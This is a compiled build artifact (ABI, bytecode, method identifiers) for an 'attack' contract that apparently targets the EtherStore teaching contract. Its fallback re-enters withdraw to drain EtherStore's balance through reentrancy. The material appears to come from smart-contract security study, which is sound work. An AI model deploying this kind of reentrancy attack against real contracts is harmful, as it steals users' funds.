{
    "abi": [
        {
            "type": "constructor",
            "inputs": [
                {
                    "name": "_etherStoreAddress",
                    "type": "address",
                    "internalType": "address"
                }
            ],
            "stateMutability": "nonpayable"
        },
        {
            "type": "fallback",
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "AMOUNT",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "uint256",
                    "internalType": "uint256"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "attack",
            "inputs": [
                {
                    "name": "i",
                    "type": "uint256",
                    "internalType": "uint256"
                }
            ],
            "outputs": [],
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "etherStore",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "address",
                    "internalType": "contract EtherStore"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "getBalance",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "uint256",
                    "internalType": "uint256"
                }
            ],
            "stateMutability": "view"
        }
    ],
    "bytecode": {
        "object": "0x6080604052348015600f57600080fd5b50604051610300380380610300833981016040819052602c916050565b600080546001600160a01b0319166001600160a01b0392909216919091179055607e565b600060208284031215606157600080fd5b81516001600160a01b0381168114607757600080fd5b9392505050565b6102738061008d6000396000f3fe60806040526004361061003f5760003560e01c806312065fe0146100bb57806364dd891a146100dd578063acd2e6e5146100f0578063d178917614610128575b600054655af3107a40006001600160a01b0390911631106100b957600054604051632e1a7d4d60e01b8152600160048201526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b1580156100a057600080fd5b505af11580156100b4573d6000803e3d6000fd5b505050505b005b3480156100c757600080fd5b50475b6040519081526020015b60405180910390f35b6100b96100eb366004610224565b610142565b3480156100fc57600080fd5b50600054610110906001600160a01b031681565b6040516001600160a01b0390911681526020016100d4565b34801561013457600080fd5b506100ca655af3107a400081565b655af3107a400034101561015557600080fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0655af3107a40006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101a957600080fd5b505af11580156101bd573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b8152600481018690526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b15801561020957600080fd5b505af115801561021d573d6000803e3d6000fd5b5050505050565b60006020828403121561023657600080fd5b503591905056fea2646970667358221220bf015014f4c7c663b92b28ddf29dc78350054f7dab3450e2bfbff41ab6666bf864736f6c634300081a0033",
        "linkReferences": {}
    },
    "methodIdentifiers": {
        "AMOUNT()": "d1789176",
        "attack(uint256)": "64dd891a",
        "etherStore()": "acd2e6e5",
        "getBalance()": "12065fe0"
    },
    "id": 56
}